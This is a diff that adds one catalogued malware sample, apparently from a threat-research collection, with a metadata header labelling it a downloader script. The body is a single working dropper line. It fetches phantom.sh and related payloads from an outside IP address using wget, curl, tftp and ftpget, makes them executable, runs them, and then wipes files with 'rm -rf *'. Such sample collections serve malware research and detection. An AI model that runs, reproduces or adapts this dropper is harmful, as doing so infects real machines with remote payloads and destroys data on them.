@@ -1,0 +1,10 @@
+# sha256: 6a115f1715c6bd13ca07694318d0e6cfd7a24093bc7c09d5a6b0966d7e757edd
+# family: downloader
+# kind: script
+# size_bytes: 477
+# first_seen: 2026-07-25 15:36:01.468367 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.42.213/phantom.sh; curl -O http://91.92.42.213/phantom.sh; chmod 777 phantom.sh; sh phantom.sh; tftp 91.92.42.213 -c get phantom.sh; chmod 777 phantom.sh; sh phantom.sh; tftp -r phantom2.sh -g 91.92.42.213; chmod 777 phantom2.sh; sh phantom2.sh; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.213 phantom1.sh phantom1.sh; sh phantom1.sh; rm -rf phantom.sh phantom.sh phantom2.sh phantom1.sh; rm -rf *
